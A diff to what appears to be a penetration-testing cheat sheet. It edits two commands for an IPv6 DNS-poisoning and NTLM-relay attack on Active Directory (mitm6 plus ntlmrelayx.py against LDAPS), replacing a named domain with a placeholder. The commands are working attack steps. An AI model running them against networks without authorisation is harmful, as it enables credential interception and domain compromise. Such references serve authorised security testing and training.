@@ -8,5 +8,5 @@
 
 Description | Commands
 ------------ | -------------
-*First set up ntlmrelay* | `ntlmrelayx.py -6 -t ldaps://10.0.10.26 -wh fake.cyberlabs.kz -l loot`
-*Start mitm6 on the same network that hosts in* | `mitm6.py -d cyberlabs.kz`
+*First set up ntlmrelay* | `ntlmrelayx.py -6 -t ldaps://10.0.10.26 -wh <DOMAIN> -l loot`
+*Start mitm6 on the same network that hosts in* | `mitm6.py -d <DOMAIN>`
